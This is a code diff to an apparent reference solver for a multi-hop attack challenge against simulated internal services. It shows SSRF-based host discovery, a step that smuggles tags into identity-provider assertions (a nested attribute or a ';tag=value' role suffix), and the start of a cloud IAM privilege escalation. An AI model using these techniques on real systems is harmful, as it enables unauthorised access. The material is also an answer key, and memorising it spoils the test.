@@ -56,16 +56,26 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     # ---- hop 1: recon --------------------------------------------------------------------------
     metrics = _get(f"{base}/metrics").decode(errors="replace")
     marker(metrics)
-    hosts = sorted(set(re.findall(r"([a-z0-9-]+\.corp\.internal):8080", metrics)))
-
-    def host(substr):
-        for h in hosts:
-            if substr in h:
-                return f"http://{h}:8080"
-        raise SolveError(f"no internal host matching {substr!r}")
-
-    CI, DIR, IDP, IAM, DEP = host("ci"), host("directory"), host("idp"), host("cloudiam"), host("deployment")
-    st["hosts"] = {"ci": CI, "directory": DIR, "idp": IDP, "cloudiam": IAM, "deployment": DEP}
+    hostnames = sorted(set(re.findall(r"([a-z0-9-]+\.corp\.internal):8080", metrics)))
+    # Hostnames don't telegraph the role — PROBE each advertised host's `/` and read its `service`
+    # self-identification. Decoys don't resolve (SSRF error) and are dropped.
+    _ROLE = {"ci": "ci", "directory": "directory", "idp": "idp", "federation": "idp",
+             "iam": "cloudiam", "deploy": "deployment"}
+    by_role = {}
+    for hn in hostnames:
+        try:  # decoy hosts don't resolve -> the portal returns 502; skip them
+            idx = ssrf(f"http://{hn}:8080/")
+        except Exception:  # noqa: BLE001
+            continue
+        svc = idx.get("service", "") if isinstance(idx, dict) else ""
+        for key, role in _ROLE.items():
+            if key in svc and role not in by_role:
+                by_role[role] = f"http://{hn}:8080"
+    missing = {"ci", "directory", "idp", "cloudiam", "deployment"} - set(by_role)
+    if missing:
+        raise SolveError(f"could not identify hosts for {missing}")
+    CI, DIR, IDP, IAM, DEP = (by_role[r] for r in ("ci", "directory", "idp", "cloudiam", "deployment"))
+    st["hosts"] = dict(by_role)
 
     # ---- hop 2: credential ---------------------------------------------------------------------
     ssrf(f"{CI}/pipeline/config")  # observe the honeytoken; do not use it
@@ -103,8 +113,8 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     marker(a0)
     sess0 = ssrf(f"{IAM}/iam/session?assertion={a0['assertion']}")["session"]
     desc = ssrf(f"{IAM}/iam/describe?session={sess0}")
-    claim_ns = desc["session_tag_source"]["claim"].split(".", 1)[1]
     family = desc.get("escalation_family")
+    fed_family = desc.get("federation_family", "nested-attr")
 
     def find_condition(d):
         if isinstance(d, dict):
@@ -119,11 +129,17 @@ def solve(base: str, echo=print, state: dict = None) -> str:
         return None
 
     tag_name, tag_value = find_condition(desc)
-    smug = {"entitlement": ent, "role": granted_role, "attributes": {claim_ns: {tag_name: tag_value}}}
+    # smuggle by the discovered federation family: a nested attribute, or the role scope suffix.
+    if fed_family == "scoped-role":
+        smug = {"entitlement": ent, "role": f"{granted_role};{tag_name}={tag_value}", "attributes": {}}
+        claim_ns = None
+    else:  # nested-attr
+        claim_ns = desc["session_tag_source"]["claim"].split(".", 1)[1]
+        smug = {"entitlement": ent, "role": granted_role, "attributes": {claim_ns: {tag_name: tag_value}}}
     a1 = ssrf(f"{IDP}/idp/assert?p={b64u(smug)}")
     sess1 = ssrf(f"{IAM}/iam/session?assertion={a1['assertion']}")["session"]
     st.update(claim_ns=claim_ns, tag_name=tag_name, tag_value=tag_value, family=family,
-              bootstrap_session=sess0, tagged_session=sess1)
+              fed_family=fed_family, bootstrap_session=sess0, tagged_session=sess1)
 
     # ---- hop 5: cloud IAM privesc — mechanism depends on the discovered family -----------------
     caps = ssrf(f"{DEP}/deploy/capabilities")
